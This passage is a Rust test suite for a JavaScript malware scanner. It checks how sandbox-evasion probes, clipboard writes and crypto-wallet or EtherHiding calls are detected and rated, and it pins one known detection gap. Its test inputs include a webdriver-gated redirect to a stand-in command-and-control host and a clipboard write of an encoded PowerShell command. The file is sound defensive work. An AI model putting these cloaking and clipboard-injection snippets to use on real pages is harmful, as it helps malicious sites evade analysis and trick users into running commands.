            let report = run(src);
            assert!(
                report.js_flags().iter().any(|f| matches!(
                    f, JsFlag::SandboxEvasion { technique, .. } if technique == want
                )),
                "ungated probe was not downgraded ({want}): {src}"
            );
        }
    }

    /// The two properties js_analyser treats as EXCULPATORY — reading them near a probe
    /// is how the Python layer concludes "legitimate fingerprinting SDK". Carapace rating
    /// them HIGH/MEDIUM made the two layers contradict each other on the same fact.
    #[test]
    fn capability_reads_are_low_not_high() {
        for (src, code) in [
            ("var mem = navigator.deviceMemory;", "SANDBOX_EVASION_HARDWARE_FINGERPRINT"),
            ("var cores = navigator.hardwareConcurrency;", "SANDBOX_EVASION_HARDWARE_FINGERPRINT"),
            ("var langs = navigator.languages;", "SANDBOX_EVASION_LANGUAGES"),
        ] {
            let report = run(src);
            let sev = report.flags.iter().find(|f| f.code == code).map(|f| f.severity);
            assert_eq!(sev, Some(Severity::Low), "{code} should be LOW: {src}");
        }
    }

    /// Deliberately NOT downgraded: these name automation TOOLING, not a device
    /// characteristic ordinary code reads. If this ever goes LOW it is a mistake.
    #[test]
    fn headless_tooling_strings_stay_high() {
        for src in [
            r#"if (navigator.userAgent.indexOf("HeadlessChrome") > -1) { render(); }"#,
            r#"var m = window["$cdc_asdjflasutopfhvcZLmcfl_"]; log(m);"#,
            r#"var n = window["__nightmare"]; log(n);"#,
        ] {
            let report = run(src);
            let sev = report.flags.iter()
                .find(|f| f.code == "SANDBOX_EVASION_HEADLESS_STRING").map(|f| f.severity);
            assert_eq!(sev, Some(Severity::High), "headless tooling marker must stay HIGH: {src}");
        }
    }

    /// The severity table is the half that actually mislabelled currys.co.uk — the
    /// technique split is worthless if both map to HIGH.
    #[test]
    fn ungated_webdriver_probe_scores_low() {
        let gated = run("if (navigator.webdriver) { window.location = 'https://c2.example.com'; }");
        let ungated = run("if (navigator.webdriver) { console.log('automation'); }");
        let sev_of = |r: &ThreatReport, code: &str| {
            r.flags.iter().find(|f| f.code == code).map(|f| f.severity)
        };
        assert_eq!(sev_of(&gated, "SANDBOX_EVASION_WEBDRIVER"), Some(Severity::High));
        assert_eq!(
            sev_of(&ungated, "SANDBOX_EVASION_WEBDRIVER_UNGATED"),
            Some(Severity::Low)
        );
        assert_eq!(sev_of(&ungated, "SANDBOX_EVASION_WEBDRIVER"), None);
    }

    #[test]
    fn detects_outer_height_probe() {
        let report = run("var h = window.outerHeight; if (h === 0) { doEvil(); }");
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::SandboxEvasion { technique, .. } if technique == "screen_dimension_probe"
        )));
    }

    #[test]
    fn detects_headless_chrome_string() {
        let report = run(r#"if (navigator.userAgent.includes("HeadlessChrome")) { return false; }"#);
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::SandboxEvasion { technique, .. } if technique == "headless_string_probe"
        )));
    }

    #[test]
    fn detects_phantom_js_string() {
        let report = run(r#"if (window["_phantom"]) { throw new Error("bot"); }"#);
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::SandboxEvasion { technique, .. } if technique == "headless_string_probe"
        )));
    }

    #[test]
    fn detects_navigator_plugins_probe() {
        let report = run("if (navigator.plugins.length === 0) { redirect(); }");
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::SandboxEvasion { technique, .. } if technique == "plugins_probe"
        )));
    }

    #[test]
    fn detects_navigator_languages_probe() {
        let report = run("if (navigator.languages.length === 0) { redirect(); }");
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::SandboxEvasion { technique, .. } if technique == "languages_probe"
        )));
    }

    #[test]
    fn detects_notification_permission_probe() {
        // Was `if (Notification.permission === "default") { serveClean(); }` before the
        // 2026-08-18 gating change. `serveClean()` is a call to a function defined
        // elsewhere, so no content-delivery sink is visible in the window and the probe
        // now classifies as ungated — see the known-gap test below, which pins that
        // behaviour deliberately rather than letting this test hide it. The cloaking
        // assertion is kept here with the sink made explicit.
        let report = run(
            r#"if (Notification.permission === "default") { document.write(cleanPage); }"#,
        );
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::SandboxEvasion { technique, .. } if technique == "notification_probe"
        )));
    }

    /// KNOWN GAP, pinned so it is visible rather than discovered later: when the cloaking
    /// branch calls a named function whose body lives elsewhere, no sink appears in the
    /// ±700-byte window and the probe is classified ungated (LOW). The Python analyser
    /// has the identical limitation for `navigator.webdriver` and documents it the same
    /// way. Context collapse is what recovers these — an ungated probe on a DGA or newly
    /// registered domain still escalates. If this test ever starts failing because the
    /// technique became gated, that is an IMPROVEMENT: widen the sink set and delete it.
    #[test]
    fn indirect_sink_behind_a_function_call_is_not_seen_as_gating() {
        let report = run(r#"if (Notification.permission === "default") { serveClean(); }"#);
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::SandboxEvasion { technique, .. }
            if technique == "notification_probe_ungated"
        )));
    }

    #[test]
    fn detects_hardware_fingerprint_probe_device_memory() {
        let report = run("if (!navigator.deviceMemory) { redirect(); }");
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::SandboxEvasion { technique, .. } if technique == "hardware_fingerprint_probe"
        )));
    }

    #[test]
    fn detects_hardware_fingerprint_probe_hardware_concurrency() {
        let report = run("var cores = navigator.hardwareConcurrency; if (!cores) { redirect(); }");
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::SandboxEvasion { technique, .. } if technique == "hardware_fingerprint_probe"
        )));
    }

    #[test]
    fn detects_clipboard_write_text() {
        let report = run(r#"navigator.clipboard.writeText("powershell -enc ABC")"#);
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::ClipboardWrite { method, .. } if method == "navigator.clipboard.writeText"
        )));
    }

    #[test]
    fn detects_execcommand_copy() {
        let report = run(r#"document.execCommand('copy')"#);
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::ClipboardWrite { method, .. } if method == "document.execCommand(copy)"
        )));
    }

    #[test]
    fn detects_wallet_rpc_method_string() {
        let report = run(r#"provider.request({ method: "eth_sendTransaction", params: [tx] })"#);
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::CryptoWalletApi { method } if method == "eth_sendTransaction"
        )));
    }

    #[test]
    fn benign_string_not_flagged_as_wallet_api() {
        let report = run(r#"var x = "send_transaction_to_server";"#);
        assert!(!report.js_flags().iter().any(|f| matches!(f, JsFlag::CryptoWalletApi { .. })));
    }

    #[test]
    fn detects_etherhiding_eth_call_no_wallet() {
        // Raw JSON-RPC eth_call to a contract, no wallet → EtherHiding.
        let report = run(r#"fetch(rpc,{method:'POST',body:JSON.stringify({method:"eth_call",params:[{to:"0x1234567890abcdef1234567890abcdef12345678",data:"0x"}]})})"#);
        assert!(report.js_flags().iter().any(|f| matches!(f, JsFlag::EtherHidingRead)));
    }

    #[test]
    fn wallet_dapp_not_flagged_as_etherhiding() {
        // A real dApp uses the injected wallet — must NOT fire EtherHiding.
        let report = run(r#"window.ethereum.request({method:"eth_call",params:[{to:"0x1234567890abcdef1234567890abcdef12345678"}]})"#);
        assert!(!report.js_flags().iter().any(|f| matches!(f, JsFlag::EtherHidingRead)));
    }

    #[test]
    fn eth_call_without_contract_not_flagged() {
        let report = run(r#"var m = "eth_call";"#);
        assert!(!report.js_flags().iter().any(|f| matches!(f, JsFlag::EtherHidingRead)));
    }
}
